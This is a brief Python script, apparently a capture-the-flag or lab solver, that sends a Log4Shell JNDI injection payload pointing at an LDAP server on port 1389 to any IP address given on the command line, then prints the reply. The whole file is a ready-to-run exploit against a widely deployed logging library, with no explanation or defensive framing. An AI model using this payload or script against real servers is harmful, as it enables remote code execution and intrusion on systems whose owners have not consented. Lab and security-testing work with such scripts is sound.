from mnm import *
import requests

@mixed()
def solve(ip):
    r = requests.get(f'https://{ip}/', data={
        "log": "${jndi:ldap://localhost:1389/Basic/BinaryInj#z}"
    }, verify=False)
    print(r.text)

def test(ip):
    solve(ip)

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <ip>")
        exit(1)
    
    test(sys.argv[1])